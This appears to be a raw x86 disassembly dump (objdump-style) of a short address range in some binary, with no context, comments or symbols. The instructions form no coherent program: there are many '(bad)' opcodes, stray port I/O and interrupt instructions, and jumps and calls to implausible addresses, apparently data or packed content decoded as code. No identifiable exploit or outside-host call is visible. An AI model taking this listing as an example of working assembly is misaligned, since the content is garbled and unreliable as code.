  41b632:	retf   0x5ff5
  41b635:	sub    ch,dh
  41b637:	ins    BYTE PTR es:[edi],dx
  41b638:	repnz push cs
  41b63a:	xlat   BYTE PTR ds:[ebx]
  41b63b:	test   DWORD PTR [eax],edx
  41b63d:	cld    
  41b63e:	mov    al,ds:0x9b4164fa
  41b643:	mov    bh,0x8d
  41b645:	aas    
  41b646:	or     eax,0x32e1d7a4
  41b64b:	pop    esi
  41b64c:	sub    al,0xae
  41b64e:	mov    esi,0x970ba98
  41b653:	jle    0x41b68a
  41b655:	add    dh,BYTE PTR [eax]
  41b657:	test   DWORD PTR [esi],edx
  41b659:	jae    0x41b62b
  41b65b:	shr    BYTE PTR [esi],cl
  41b65d:	sub    ch,ch
  41b65f:	jecxz  0x41b69d
  41b661:	popa   
  41b662:	or     DWORD PTR [eax],edx
  41b664:	jno    0x41b68c
  41b666:	jg     0x41b67b
  41b668:	dec    edi
  41b669:	inc    esi
  41b66a:	push   ecx
  41b66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66c:	fcom   QWORD PTR [eax+0x2e10fca5]
  41b672:	test   eax,0x7b63c256
  41b677:	xor    al,0x46
  41b679:	aam    0x28
  41b67b:	mul    DWORD PTR ds:0x338c6aaf
  41b681:	sbb    esi,ebx
  41b683:	mov    edx,DWORD PTR [esi+0x12094acb]
  41b689:	iret   
  41b68a:	or     eax,0xfb843e35
  41b68f:	fiadd  WORD PTR [edi+0x75]
  41b692:	in     eax,dx
  41b693:	fcmovu st,st(4)
  41b695:	mov    esi,0xa57853f6
  41b69a:	push   esp
  41b69b:	mov    ecx,0xd1e562ef
  41b6a0:	out    0xc4,al
  41b6a2:	pushf  
  41b6a3:	ins    BYTE PTR es:[edi],dx
  41b6a4:	fstp   TBYTE PTR [esi-0x4b]
  41b6a7:	jae    0x41b629
  41b6a9:	xor    al,0x64
  41b6ab:	xor    edx,edx
  41b6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ae:	scas   al,BYTE PTR es:[edi]
  41b6af:	push   edi
  41b6b0:	test   DWORD PTR [ebp+0x3c7083a9],ebp
  41b6b6:	data16 jae 0x41b72d
  41b6b9:	daa    
  41b6ba:	add    BYTE PTR [bp+0x13],al
  41b6be:	fs ret 
  41b6c0:	or     BYTE PTR [edi],dh
  41b6c2:	dec    eax
  41b6c3:	fimul  WORD PTR [esi]
  41b6c5:	in     al,dx
  41b6c6:	jmp    0x7274:0x65067f1b
  41b6cd:	mov    dh,BYTE PTR [edx]
  41b6cf:	mov    ebx,0xfb090f17
  41b6d4:	ret    
  41b6d5:	xor    al,0x27
  41b6d7:	add    eax,0x7dd8d22d
  41b6dc:	jl     0x41b6c5
  41b6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6df:	loope  0x41b735
  41b6e1:	pop    edi
  41b6e3:	mov    cl,0x2b
  41b6e5:	ins    DWORD PTR es:[edi],dx
  41b6e6:	push   cs
  41b6e7:	xor    edi,DWORD PTR [edi-0x49]
  41b6ea:	xchg   DWORD PTR [edx+0xe26d61e],ecx
  41b6f0:	sar    bl,0xf2
  41b6f3:	daa    
  41b6f4:	test   eax,0x427bc70
  41b6f9:	mov    cl,0x14
  41b6fb:	xchg   esi,eax
  41b6fc:	jge    0x41b707
  41b6fe:	cmc    
  41b6ff:	dec    esp
  41b700:	and    al,0x20
  41b702:	in     eax,0x86
  41b704:	and    dl,al
  41b706:	out    dx,eax
  41b707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b708:	aas    
  41b709:	add    eax,0xbdb9f014
  41b70e:	sbb    al,0x7b
  41b710:	fdiv   DWORD PTR [ecx+0x6873b770]
  41b716:	std    
  41b717:	sahf   
  41b718:	in     eax,dx
  41b719:	iret   
  41b71a:	(bad)  
  41b71b:	(bad)  
  41b71c:	mov    edi,0xf0aa58cf
  41b721:	inc    esp
  41b722:	pop    edi
  41b723:	int    0x8e
  41b725:	ins    BYTE PTR es:[edi],dx
  41b726:	push   esp
  41b727:	nop
  41b728:	jb     0x41b6fa
  41b72a:	or     al,0xe2
  41b72c:	loope  0x41b77a
  41b72e:	shl    DWORD PTR [esi-0x1e24ef33],0xbd
  41b735:	pushf  
  41b736:	loop   0x41b7b5
  41b738:	mov    bl,0x66
  41b73a:	jbe    0x41b70d
  41b73c:	lods   eax,DWORD PTR ds:[esi]
  41b73d:	pusha  
  41b73e:	xor    ebp,esi
  41b740:	push   ds
  41b741:	mov    al,ds:0x9d49dbf8
  41b746:	mov    ah,0xf9
  41b748:	out    0x7b,eax
  41b74a:	and    edx,0x53
  41b74d:	mov    ds:0x81144541,eax
  41b752:	adc    DWORD PTR [ebp-0x3a],ecx
  41b755:	ret    
  41b756:	pop    ss
  41b757:	or     BYTE PTR ss:[ecx-0x7a],dl
  41b75b:	add    ah,bh
  41b75d:	daa    
  41b75e:	daa    
  41b75f:	int    0x51
  41b761:	ins    DWORD PTR es:[edi],dx
  41b762:	push   esp
  41b763:	sub    ebp,DWORD PTR [edi+0x7c47ef6a]
  41b769:	outs   dx,DWORD PTR ds:[esi]
  41b76a:	jno    0x41b742
  41b76c:	xchg   ebp,eax
  41b76d:	adc    bh,BYTE PTR [esi+0x17]
  41b770:	jnp    0x41b7d9
  41b772:	nop
  41b773:	rcl    DWORD PTR [edi-0x2f],1
  41b776:	in     eax,0x76
  41b778:	js     0x41b7d7
  41b77a:	sbb    eax,DWORD PTR [ecx+0x44]
  41b77d:	lods   al,BYTE PTR ds:[esi]
  41b77e:	pop    ebx
  41b77f:	in     al,dx
  41b780:	xlat   BYTE PTR ds:[ebx]
  41b781:	mov    ebx,0x5d980b3a
  41b786:	mov    ebx,eax
  41b788:	fs out dx,al
  41b78a:	sbb    BYTE PTR [ebx],bh
  41b78c:	mov    al,0x29
  41b78e:	jns    0x41b718
  41b790:	(bad)  [ecx+0x18]
  41b793:	and    eax,0xe2cd493d
  41b798:	imul   ebp,ebx,0xffffffb5
  41b79b:	add    DWORD PTR [edi-0x6b1cd44a],eax
  41b7a1:	inc    ebp
  41b7a2:	ja     0x41b78b
  41b7a4:	jbe    0x41b729
  41b7a6:	into   
  41b7a7:	adc    bl,al
  41b7a9:	shl    DWORD PTR [ebx],1
  41b7ab:	enter  0x5ad0,0x3e
  41b7af:	(bad)  
  41b7b0:	imul   BYTE PTR [edx+0x41]
  41b7b3:	loop   0x41b7dc
  41b7b5:	jl     0x41b824
  41b7b7:	xchg   ecx,eax
  41b7b8:	mov    ebp,DWORD PTR [ebx]
  41b7ba:	ret    0x12ca
  41b7bd:	ret    
  41b7be:	ins    DWORD PTR es:[edi],dx
  41b7bf:	aam    0xda
  41b7c1:	ret    0x4e76
  41b7c4:	mov    edx,0x33881992
  41b7c9:	xor    BYTE PTR [ecx],0x95
  41b7cc:	jno    0x41b7ac
  41b7ce:	and    bl,BYTE PTR [ecx+0x4c846d2a]
  41b7d4:	sbb    al,0x4e
  41b7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7d7:	(bad)  
  41b7d8:	push   ebp
  41b7d9:	jbe    0x41b7c4
  41b7db:	or     BYTE PTR [ebx+edi*4],0x86
  41b7df:	and    eax,0xc67318b6
  41b7e4:	iret   
  41b7e5:	jbe    0x41b7ae
  41b7e7:	fidiv  DWORD PTR [ebx-0x5b6f7acb]
  41b7ed:	inc    esp
  41b7ee:	jp     0x41b820
  41b7f0:	dec    ebx
  41b7f1:	gs pop edx
  41b7f3:	jb     0x41b840
  41b7f5:	popa   
  41b7f6:	cmp    ch,BYTE PTR [ecx+0x7d]
  41b7f9:	in     eax,0xf1
  41b7fb:	int    0xf3
  41b7fd:	dec    ebx
  41b7fe:	xor    DWORD PTR [edx-0x46],0x71
  41b802:	xchg   ch,dh
  41b804:	ss mov ah,0x5a
  41b807:	retf   
  41b808:	in     al,dx
  41b809:	dec    ebx
  41b80a:	xchg   ebx,eax
  41b80b:	jecxz  0x41b878
  41b80d:	add    edi,ebp
  41b80f:	call   0xdb31b15b
  41b814:	repz inc ebx
  41b816:	mov    ds:0x52efdb37,al
  41b81b:	dec    edx
  41b81c:	sub    BYTE PTR [ecx-0x327aaabd],0xc8
  41b823:	xor    esi,eax
  41b825:	repnz nop
  41b827:	ror    BYTE PTR [edi],1
  41b829:	ret    0xf818
  41b82c:	mov    ah,0x2f
  41b82e:	rcl    BYTE PTR [edi-0x312449c1],cl
  41b834:	(bad)  
  41b835:	in     eax,0x60
  41b837:	mov    DWORD PTR [esi-0x60],esi
  41b83a:	push   esi
  41b83b:	or     DWORD PTR [esi-0x643c096f],esi
  41b841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b842:	aam    0xb6
  41b844:	mov    dl,0x9c
  41b846:	xchg   ebx,eax
  41b847:	fdiv   QWORD PTR [eax]
  41b849:	sahf   
  41b84a:	jo     0x41b839
  41b84c:	add    edi,DWORD PTR [edx+0x12]
  41b84f:	add    BYTE PTR [edi+edx*8],ah
  41b852:	enter  0xcb7f,0xc2
  41b856:	sub    ah,dh
  41b858:	and    bh,BYTE PTR [ebp+0x34ebfccd]
  41b85e:	jge    0x41b831
  41b860:	adc    DWORD PTR [ecx-0x6a1c6e48],ebx
  41b866:	pop    es
  41b867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b868:	jbe    0x41b8cc
  41b86a:	or     ebx,ebx
  41b86c:	push   esp
  41b86d:	out    0x57,eax
  41b86f:	mov    ebp,ecx
  41b871:	gs sbb al,0xa6
  41b874:	or     ebp,DWORD PTR [ebx+0x2c]
  41b877:	pop    ss
  41b878:	pop    esi
  41b879:	ja     0x41b81d
  41b87b:	out    dx,eax
  41b87c:	dec    ecx
  41b87d:	into   
  41b87e:	rcl    BYTE PTR [eax],1
  41b880:	sti    
  41b881:	imul   ebx,DWORD PTR [edi+0x3cde46d3],0xffffff87
  41b888:	retf   0xa678
  41b88b:	mov    esi,0x825d3281
  41b890:	idiv   BYTE PTR [eax]
  41b892:	pop    ecx
  41b893:	push   0xffffff9f
  41b895:	jecxz  0x41b833
  41b897:	ror    DWORD PTR [esi-0x34],1
  41b89a:	jne    0x41b831
  41b89c:	stos   DWORD PTR es:[edi],eax
  41b89d:	push   es
  41b89e:	sub    ebx,0x39902c11
  41b8a4:	sti    
  41b8a5:	imul   ebx,DWORD PTR [edi],0xffffffde
  41b8a8:	lods   eax,DWORD PTR ds:[esi]
  41b8a9:	test   BYTE PTR [ebx+0x3d],0x27
  41b8ad:	aaa    
  41b8ae:	pop    ss
  41b8af:	xchg   esp,eax
  41b8b0:	sahf   
  41b8b1:	pushf  
  41b8b2:	(bad)  
  41b8b3:	mov    DWORD PTR [ecx*2+0x319e8877],edi
  41b8ba:	sbb    al,0x65
  41b8bc:	dec    eax
  41b8bd:	iret   
  41b8be:	xor    esi,DWORD PTR [ecx-0x7d]
  41b8c1:	sbb    BYTE PTR [eax],dh
  41b8c3:	add    eax,0xb246455e
  41b8c8:	pop    ebp
  41b8c9:	xchg   ecx,eax
  41b8ca:	(bad)  
  41b8cb:	adc    al,0xcf
  41b8cd:	test   eax,0x1c17dfcf
  41b8d2:	repz cmp esi,DWORD PTR [ebx]
  41b8d5:	or     edx,DWORD PTR [edi]
  41b8d7:	push   edx
  41b8d8:	(bad)  
  41b8d9:	daa    
  41b8da:	jecxz  0x41b943
  41b8dc:	sub    ch,BYTE PTR [eax+ecx*2+0x28]
  41b8e0:	dec    edi
  41b8e1:	xchg   edx,eax
  41b8e2:	inc    ebp
  41b8e3:	mov    edx,0x7ebc7db3
  41b8e8:	pop    ds
  41b8e9:	mov    ch,0x11
  41b8eb:	pusha  
  41b8ec:	add    edx,DWORD PTR [edi-0x33]
  41b8ef:	stc    
  41b8f0:	cmp    DWORD PTR [edi+0x4bd12031],0xffffffa4
  41b8f7:	lea    edi,[ebx-0x66b63ed7]
  41b8fd:	adc    ebx,eax
  41b8ff:	call   0x178249a2
  41b904:	dec    ebp
  41b905:	and    DWORD PTR [ebp+0x42],eax
  41b908:	(bad)  
  41b909:	lods   eax,DWORD PTR ds:[esi]
  41b90a:	jmp    0x7767df66
  41b90f:	icebp  
  41b910:	cmp    BYTE PTR [edx+0x34d6591b],bh
  41b916:	sbb    eax,0x6f8dfc1a
  41b91b:	push   edx
  41b91c:	mov    eax,ds:0xf66fe01a
  41b921:	add    cl,BYTE PTR [edx+edi*8]
  41b924:	imul   ecx,ebp,0x2053250e
  41b92a:	fprem  
  41b92c:	add    eax,0x4ea6da68
  41b931:	sar    BYTE PTR [ecx-0x78],1
  41b934:	pop    ds
  41b935:	(bad)
  41b939:	ror    DWORD PTR [eax-0xa],1
  41b93c:	fisub  DWORD PTR [esi+ebp*4+0x716d1e8e]
  41b943:	adc    bh,BYTE PTR [esi+eiz*1]
  41b946:	push   ds
  41b947:	dec    edx
  41b948:	inc    eax
  41b949:	push   cs
  41b94a:	jge    0x41b990
  41b94c:	out    0x73,al
  41b94e:	fsubr  DWORD PTR [ebx]
  41b950:	and    ah,BYTE PTR [edi]
  41b952:	shl    BYTE PTR [edx],cl
  41b954:	addr16 or esi,edi
  41b957:	push   esp
  41b958:	jne    0x41b967
  41b95a:	ins    BYTE PTR es:[edi],dx
  41b95b:	cmp    DWORD PTR [edi+0x1fb739e8],edi
  41b961:	push   ebx
  41b962:	gs in  eax,dx
  41b964:	adc    al,0x25
  41b966:	dec    ebx
  41b967:	xor    al,0x77
  41b969:	cld    
  41b96a:	pop    esi
  41b96b:	jp     0x41b989
  41b96d:	addr16 push ebx
  41b96f:	popf   
  41b970:	mov    ebp,0x59414171
  41b975:	mov    ah,0x9f
  41b977:	push   ebp
  41b978:	mov    eax,ds:0xb4f073e9
  41b97d:	pop    DWORD PTR [edi+0x11]
  41b980:	xor    DWORD PTR es:[ecx-0x7c5b9629],esp
  41b987:	push   cs
  41b988:	mov    al,0xfe
  41b98a:	sub    al,0x34
  41b98c:	inc    eax
  41b98d:	lock push ecx
  41b98f:	pop    ds
  41b990:	stos   DWORD PTR es:[edi],eax
  41b991:	rcl    BYTE PTR [edx+0x1af28286],0xc7
  41b998:	aad    0x6c
  41b99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b99b:	dec    edi
  41b99c:	push   ebx
  41b99d:	std    
  41b99e:	ins    DWORD PTR es:[edi],dx
  41b99f:	jmp    0x41b946
  41b9a1:	or     dh,BYTE PTR [ebp-0x3b]
  41b9a4:	repnz mov dh,0xe8
  41b9a7:	loop   0x41b98e
  41b9a9:	iret   
  41b9aa:	mov    al,ds:0xa987b6ae
  41b9af:	clc    
  41b9b0:	sbb    al,0x4e
  41b9b2:	imul   esp,ebp,0x74
  41b9b5:	lock xchg ecx,eax
  41b9b7:	jecxz  0x41b9fb
  41b9b9:	mov    ebp,ebp
  41b9bb:	adc    BYTE PTR [ebx*1-0x7ce3468b],ch
  41b9c2:	imul   esp,DWORD PTR [esi-0x12],0xa61e520c
  41b9c9:	rol    DWORD PTR [ebp+0x49a97c9e],1
  41b9cf:	data16 and bl,BYTE PTR [ebx+ebx*2]
  41b9d3:	(bad)  
  41b9d4:	bound  edx,QWORD PTR [edx-0x2b62dc57]
  41b9da:	jmp    0x41b9df
  41b9dc:	xchg   ebp,eax
  41b9dd:	mov    ds:0xda540043,eax
  41b9e2:	stos   DWORD PTR es:[edi],eax
  41b9e3:	dec    eax
  41b9e4:	rcl    edi,1
  41b9e6:	push   cs
  41b9e7:	sbb    BYTE PTR [eax-0x149a30c3],0xf1
  41b9ee:	div    BYTE PTR [edx+0x2d]
  41b9f1:	cdq    
  41b9f2:	ror    DWORD PTR [edx+0x4e],0x46
  41b9f6:	retf   
  41b9f7:	fs arpl si,dx
  41b9fa:	mov    WORD PTR [esi+0x38],?
  41b9fd:	mov    gs,WORD PTR [eax-0x316cb67]
  41ba03:	push   ebp
  41ba04:	imul   esi,DWORD PTR [eax+0x522dce5f],0x14110731
  41ba0e:	mov    ebp,0x1b59ace1
  41ba13:	sub    BYTE PTR [esi-0x68b30cd5],ch
  41ba19:	stos   BYTE PTR es:[edi],al
  41ba1a:	xor    ebp,DWORD PTR [edi]
  41ba1c:	xchg   edx,eax
  41ba1d:	out    dx,al
  41ba1e:	aaa    
  41ba1f:	in     al,dx
  41ba20:	pop    eax
  41ba21:	mov    dh,0x73
  41ba23:	inc    esi
  41ba24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba25:	jae    0x41ba56
  41ba27:	inc    ebx
  41ba28:	dec    ebx
  41ba29:	dec    ebx
  41ba2a:	mov    esi,0x5470c2a2
  41ba2f:	lods   eax,DWORD PTR ds:[esi]
  41ba30:	cdq    
  41ba31:	stos   DWORD PTR es:[edi],eax
  41ba32:	inc    esp
  41ba33:	mov    al,BYTE PTR ds:0x2f7aa28d
  41ba39:	push   es
  41ba3a:	add    BYTE PTR [esi],bh
  41ba3c:	cmp    eax,DWORD PTR [edi]
  41ba3e:	sub    eax,0x82d7bd5b
  41ba43:	ds pop es
  41ba45:	adc    dh,BYTE PTR [esi+0x2ac7bc7c]
  41ba4b:	jae    0x41ba8e
  41ba4d:	xchg   ecx,eax
  41ba4e:	inc    esi
  41ba4f:	adc    bl,BYTE PTR [ebx]
  41ba51:	aad    0x92
  41ba53:	adc    eax,0x39cd45db
  41ba58:	cmp    DWORD PTR ds:0xb87861ff,0x57
  41ba5f:	adc    ebp,esi
  41ba61:	fcom   st(5)
  41ba63:	xchg   ebx,ebx
  41ba65:	inc    ebp
  41ba66:	add    bl,ch
  41ba68:	scas   eax,DWORD PTR es:[edi]
  41ba69:	imul   esp,DWORD PTR [edx-0x66],0x64cd0594
  41ba70:	out    0xbf,eax
  41ba72:	sahf   
  41ba73:	fcomp  st(6)
  41ba75:	or     ah,ch
  41ba77:	xchg   esp,eax
  41ba78:	outs   dx,DWORD PTR ds:[esi]
  41ba79:	(bad)  
  41ba7a:	jg     0x41baeb
  41ba7c:	cmp    DWORD PTR [ecx+0x49],ecx
  41ba7f:	scas   al,BYTE PTR es:[edi]
  41ba80:	lods   eax,DWORD PTR ds:[esi]
  41ba81:	pop    ss
  41ba82:	jmp    0xab9b480c
  41ba87:	dec    ecx
  41ba88:	sti    
  41ba89:	and    al,BYTE PTR [ebp-0x3bb9e25f]
  41ba8f:	arpl   WORD PTR [ebp+0x38],cx
  41ba92:	daa    
  41ba93:	call   0x54d6bb2
  41ba98:	ss pop esi
  41ba9a:	call   0x69a0:0x2d8453ff
  41baa1:	lea    eax,[ebx+ecx*4-0x65]
  41baa5:	sbb    edx,ebx
  41baa7:	mov    al,ds:0x31fbc4cf
  41baac:	adc    DWORD PTR [edx+0x4d],ebp
  41baaf:	inc    ebp
  41bab0:	repnz fldcw WORD PTR [ebp+eiz*8+0x27]
  41bab5:	adc    BYTE PTR ds:0xcc76885f,bh
  41babb:	cmc    
  41babc:	arpl   bx,ax
  41babe:	mov    edi,?
  41bac0:	shr    ebp,0xa6
  41bac3:	xlat   BYTE PTR ds:[ebx]
  41bac4:	inc    esp
  41bac5:	(bad)  
  41bac6:	xor    edi,ebp
  41bac8:	aas    
  41bac9:	adc    al,0x1c
  41bacb:	add    ebx,ebp
  41bacd:	ss mov esi,0xf96797a5
  41bad3:	lock cmp al,0xd5
  41bad6:	dec    edi
  41bad7:	aas    
  41bad8:	out    0xc2,eax
  41bada:	fisttp WORD PTR [edx]
  41badc:	sub    al,0xbc
  41bade:	mov    ch,0xdb
  41bae0:	jmp    0x41bae2
  41bae2:	rol    BYTE PTR [edx-0x2d],0x92
  41bae6:	xor    bl,BYTE PTR [edi+0x73]
  41bae9:	push   edi
  41baea:	or     eax,0xc857449b
  41baef:	loopne 0x41bb67
  41baf1:	add    eax,0x9d860dc4
  41baf6:	mov    edx,0x278fe911
  41bafb:	xlat   BYTE PTR ds:[ebx]
  41bafc:	outs   dx,BYTE PTR ds:[esi]
  41bafd:	cmp    al,0xe4
  41baff:	mov    bh,0xba
  41bb01:	(bad)  
  41bb02:	jp     0x41ba9b
  41bb04:	mov    bh,0xf6
  41bb06:	dec    edx
  41bb07:	mov    ebx,0x489b7032
  41bb0c:	ja     0x41bb1f
  41bb0e:	dec    ecx
  41bb0f:	and    esi,esp
  41bb11:	pop    ecx
  41bb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb13:	jge    0x41bb1b
  41bb15:	test   DWORD PTR [eax],ebx
  41bb17:	mov    ebp,ecx
  41bb19:	jmp    0x41baa0
  41bb1b:	or     BYTE PTR [edx-0x2d],0x4
  41bb1f:	mov    edi,edx
  41bb21:	ja     0x41bb1d
  41bb23:	jb     0x41baa6
  41bb25:	stos   BYTE PTR es:[edi],al
  41bb26:	test   DWORD PTR [edx],esi
  41bb28:	mov    cx,0xb912
  41bb2c:	sub    edx,ecx
  41bb2e:	adc    BYTE PTR [esi+0x11c18f34],0xd4
  41bb35:	jg     0x3a9bb474
  41bb3b:	dec    eax
  41bb3c:	jmp    0x41bac8
  41bb3e:	lods   eax,DWORD PTR ds:[esi]
  41bb3f:	(bad)  
  41bb40:	fld    QWORD PTR [esi+edx*4+0x41445409]
  41bb47:	or     BYTE PTR [edi+ebp*1+0x26],0xfe
  41bb4c:	sub    cl,ch
  41bb4e:	sub    eax,0x61135cb7
  41bb53:	sahf   
  41bb54:	scas   eax,DWORD PTR es:[edi]
  41bb55:	push   cs
  41bb56:	sub    DWORD PTR [ebp-0x62],esi
  41bb59:	jnp    0x41bb96
  41bb5b:	dec    esp
  41bb5c:	mov    dh,0x68
  41bb5e:	(bad)  
  41bb5f:	dec    edi
  41bb60:	xchg   ecx,eax
  41bb61:	pop    ebx
  41bb62:	mov    ebx,0x2c32545f
  41bb67:	adc    BYTE PTR [edx],0x9e
  41bb6a:	push   edi
  41bb6b:	or     DWORD PTR [ecx+0x7e],ecx
  41bb6e:	or     al,0x38
  41bb70:	jnp    0x41baf9
  41bb72:	stos   DWORD PTR es:[edi],eax
  41bb73:	jb     0x41bb6e
  41bb75:	inc    edx
  41bb76:	inc    edi
  41bb77:	lds    ecx,FWORD PTR [esi-0x706fa607]
  41bb7d:	cmp    al,0x20
  41bb7f:	push   0x3
  41bb81:	mov    esi,0x8b4817f3
  41bb86:	imul   ebp,DWORD PTR [edi+0x38],0xa
  41bb8a:	sbb    DWORD PTR [esi+edx*2-0x3fd414c7],0x73
  41bb92:	pusha  
  41bb93:	push   es
  41bb94:	jns    0x41bb45
  41bb96:	jo     0x41bbb2
  41bb98:	addr16 shl ch,cl
  41bb9b:	test   DWORD PTR [edx-0x73945fe3],esp
  41bba1:	mov    bh,0x54
  41bba3:	dec    ebp
  41bba4:	xchg   ebp,eax
  41bba5:	hlt    
  41bba6:	mov    ah,0x73
  41bba8:	rcr    DWORD PTR [esi+0xb],1
  41bbab:	push   es
  41bbac:	and    BYTE PTR [ebx],0xf1
  41bbaf:	fsubrp st(3),st
  41bbb1:	inc    eax
  41bbb2:	or     al,0x31
  41bbb4:	sub    eax,0x9293d310
  41bbb9:	sbb    DWORD PTR [edi],ebp
  41bbbb:	inc    edx
  41bbbc:	bound  esi,QWORD PTR [esp+ecx*4+0x4abdc117]
  41bbc3:	ret    
  41bbc4:	call   0xc85ceb4c
  41bbc9:	dec    edi
  41bbca:	or     al,0xee
  41bbcc:	iret   
  41bbcd:	aad    0x92
  41bbcf:	add    eax,0xd27d83e2
  41bbd4:	mov    ds:0xa04278ee,al
  41bbd9:	pop    ebx
  41bbda:	loope  0x41bb5d
  41bbdc:	loop   0x41bbf6
  41bbde:	mov    ch,0x48
  41bbe0:	in     al,0x7a
  41bbe2:	aaa    
  41bbe3:	lock pop ds
  41bbe5:	inc    esi
  41bbe6:	xor    BYTE PTR [esi-0x4c7227d9],0x41
  41bbed:	mov    ds:0x7150a57b,al
  41bbf2:	inc    edx
  41bbf3:	sbb    al,0xa7
  41bbf5:	mov    DWORD PTR [edx+ebx*4-0x63309c56],esp
  41bbfc:	in     eax,0xb3
  41bbfe:	push   es
  41bbff:	fwait
  41bc00:	leave  
  41bc01:	(bad)  
  41bc03:	or     BYTE PTR [edx-0x45],0x1b
  41bc07:	ins    BYTE PTR es:[edi],dx
  41bc08:	mov    dh,0xf
  41bc0a:	sbb    bh,0xf0
  41bc0d:	sub    al,0xec
  41bc0f:	lods   al,BYTE PTR ds:[esi]
  41bc10:	add    eax,0xd0cf5d95
  41bc15:	les    edi,FWORD PTR [ebp-0x36]
  41bc18:	std    
  41bc19:	cmp    DWORD PTR [esi-0x36],edx
  41bc1c:	dec    ecx
  41bc1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc1e:	mov    bl,al
  41bc20:	mul    DWORD PTR [edi+edx*8]
  41bc23:	imul   esi,DWORD PTR [eax+0x742ce485],0xc64d70f4
  41bc2d:	fwait
  41bc2e:	cmc    
  41bc2f:	mov    ds:0x1488205f,eax
  41bc34:	jmp    0x41bc9f
  41bc36:	not    BYTE PTR [ecx-0x5c29ae33]
  41bc3c:	sbb    eax,0x239e0ae4
  41bc41:	call   0x48b4d3ba
  41bc46:	mov    ds:0x75cc5c4e,eax
  41bc4b:	sub    dl,BYTE PTR [ebx+ebx*1-0x6a714d27]
  41bc52:	mov    DWORD PTR [ecx],eax
  41bc54:	or     al,cl
  41bc56:	mov    ds:0xa57e87d3,al
  41bc5b:	mov    eax,ds:0x16966aa7
  41bc60:	shl    BYTE PTR ds:0xb0c147c,1
  41bc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc67:	bound  ecx,QWORD PTR [eax]
  41bc69:	jae    0x41bc6b
  41bc6b:	dec    ecx
  41bc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc6d:	or     edx,ebp
  41bc6f:	mov    ch,0xe1
  41bc71:	ds jno 0x41bc22
  41bc74:	sar    BYTE PTR [edi],0x34
  41bc77:	inc    esp
  41bc78:	rcl    DWORD PTR [esi-0x2e],1
  41bc7b:	and    DWORD PTR [ebx+0x78c987d2],ecx
  41bc81:	out    dx,eax
  41bc82:	mov    BYTE PTR ds:0xfb594149,ah
  41bc88:	lods   al,BYTE PTR ds:[esi]
  41bc89:	sbb    ecx,DWORD PTR [esi]
  41bc8b:	imul   edx,DWORD PTR [eax+0x617fd2db],0x71deaf8e
  41bc95:	xchg   ebp,eax
  41bc96:	xchg   esi,eax
  41bc97:	cmc    
  41bc98:	fnstenv [ebx+0x76]
  41bc9b:	or     cl,BYTE PTR [esi+edx*2]
  41bc9e:	sbb    edx,DWORD PTR [esi]
  41bca0:	out    0x54,eax
  41bca2:	xor    al,0x2b
  41bca4:	popa   
  41bca5:	jmp    0x4060d7d2
  41bcaa:	sbb    BYTE PTR [edi+0x8],ah
  41bcad:	les    ebp,FWORD PTR [ebp-0x73]
  41bcb0:	pop    ebp
  41bcb1:	bound  edx,QWORD PTR [eax]
  41bcb3:	imul   ebp,eax,0xffffff8a
  41bcb6:	pop    esi
  41bcb7:	xchg   DWORD PTR [edi+eax*1-0xe],ecx
  41bcbb:	icebp  
  41bcbc:	fisubr DWORD PTR [ebx]
  41bcbe:	std    
  41bcbf:	addr16 mov ecx,0xff51224
  41bcc5:	sar    bl,1
  41bcc7:	push   ebx
  41bcc8:	dec    ebp
  41bcc9:	inc    ecx
  41bcca:	jmp    0x41bc86
  41bccc:	jecxz  0x41bc55
  41bcce:	cmc    
  41bccf:	addr16 xor ax,0x7a03
  41bcd4:	test   ebx,esp
  41bcd6:	test   al,bh
  41bcd8:	cli    
  41bcd9:	lods   eax,DWORD PTR ds:[esi]
  41bcda:	jmp    ecx
  41bcdc:	cld    
  41bcdd:	je     0x41bcf0
  41bcdf:	repnz mov edx,0x7e871b26
  41bce5:	sahf   
  41bce6:	shr    BYTE PTR [ebx],0xa0
  41bce9:	lds    ebp,FWORD PTR [edx-0x5da48f23]
  41bcef:	ret    
  41bcf0:	lds    edx,FWORD PTR [edx-0x26]
  41bcf3:	(bad)  
  41bcf4:	mov    ch,0xfc
  41bcf6:	addr16 mov esp,0xe5f6b015
  41bcfc:	and    eax,0xd51a4561
  41bd01:	dec    ebp
  41bd02:	jae    0x41bcd5
  41bd04:	sbb    BYTE PTR ss:[eax+esi*2+0x64101e71],bh
  41bd0c:	dec    esi
  41bd0d:	xchg   edx,eax
  41bd0e:	out    0xb1,al
  41bd10:	es cmp ebp,ebp
  41bd13:	rcl    BYTE PTR [esi-0xd],cl
  41bd16:	xchg   DWORD PTR [eax-0x7ba554f],ecx
  41bd1c:	inc    esp
  41bd1d:	adc    BYTE PTR [ebx],ah
  41bd1f:	popa   
  41bd20:	mov    esi,DWORD PTR [eax-0x1c373ff4]
  41bd26:	dec    esi
  41bd27:	out    0xe8,eax
  41bd29:	(bad)  
  41bd2a:	rcr    DWORD PTR [ebp+ebp*4+0x16],1
  41bd2e:	arpl   dx,bx
  41bd30:	pop    esp
  41bd31:	sti    
  41bd32:	cwde   
  41bd33:	xchg   ebp,eax
  41bd34:	into   
  41bd35:	or     al,0xaa
  41bd37:	adc    BYTE PTR [ecx+0x4c996a9],dl
  41bd3d:	xchg   ebx,eax
  41bd3e:	ins    DWORD PTR es:[edi],dx
  41bd3f:	push   esi
  41bd40:	pusha  
  41bd41:	jmp    0xf63b:0x86116261
  41bd48:	mov    BYTE PTR [ebx+0x628286f0],dh
  41bd4e:	xor    dl,cl
  41bd50:	xor    eax,0xd0cce60
  41bd55:	sbb    esi,DWORD PTR [ebp-0x4d]
  41bd58:	cmc    
  41bd59:	xchg   BYTE PTR [edx],al
  41bd5b:	sbb    dh,bh
  41bd5d:	stc    
  41bd5e:	sbb    BYTE PTR [esi-0x41],bh
  41bd61:	add    bl,bl
